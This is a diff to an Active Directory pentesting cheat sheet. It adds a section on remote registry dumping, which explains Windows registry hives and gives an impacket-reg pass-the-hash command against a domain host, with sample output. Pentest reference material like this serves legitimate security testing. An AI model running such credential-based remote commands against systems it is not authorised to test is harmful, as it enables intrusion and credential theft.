@@ -19,13 +19,14 @@ it is the first version of this repo, many things will be added later, so stay t
   - [Lateral Mouvement](#lateral-mouvement)
     - [Bloodhound](#bloodhound)
     - [PowerView](#powerview)
-  - [Hash Cracking](#hash-cracking)
   - [Credentials Dumping](#credentials-dumping)
     - [LSASS Dumping](#lsass-dumping)
     - [NTDS Dumping](#ntds-dumping)
     - [DPAPI Dumping](#dpapi-dumping)
     - [LSA Dumping](#lsa-dumping)
     - [SAM Dumping](#sam-dumping)
+    - [Dump Registry Remotely and Directly](#dump-registry-remotely-and-directly)
+  - [Hash Cracking](#hash-cracking)
   - [Brutforce AD Password](#bruteforce-ad-password)
     - [Custom Username and Password wordlist](#custom-username-and-password-wordlist)
   - [RID Cycling](#rid-cycling)
@@ -98,6 +99,34 @@ powerview is a script from powersploit that allow enumeration of the AD architec
 **Listener Tool :**
 - `[⭐] responder` -> https://github.com/SpiderLabs/Responder
 
+## Powershell Components
+
+## Local Privilege Escalation
+
+## Lateral Mouvement
+
+## Credentials Dumping
+
+### Dump Registry Remotely and Directly
+
+[ ❓ ] **What is Registry ?** : the Registry is divided into several sections called **hives**. A registry hive is a top level registry key predefined by the Windows system to store **registry keys** for specific objectives. Each registry hives has specific objectives, there are **6 registry hives, HKCU, HKLM, HKCR, HKU, HKCC and HKPD** the most enteresting registry hives in pentesting is HKU and HKLM.
+
+**HKEY_LOCAL_MACHINE** called HKLM includes three keys SAM, SYSTEM, and SECURITY.
+
+dump HKU registry with hashes :
+```bash
+impacket-reg -hashes :34ed87d42adaa3ca4f5db34a876cb3ab domain.local/john.doe@job query -keyName HKU\\Software
+
+HKU\Software
+HKU\Software\GiganticHostingManagementSystem
+HKU\Software\Microsoft
+HKU\Software\Policies
+HKU\Software\RegisteredApplications
+HKU\Software\Sysinternals
+HKU\Software\VMware, Inc.
+HKU\Software\Wow6432Node
+HKU\Software\Classes
+```
 
 ## Hash Cracking
 
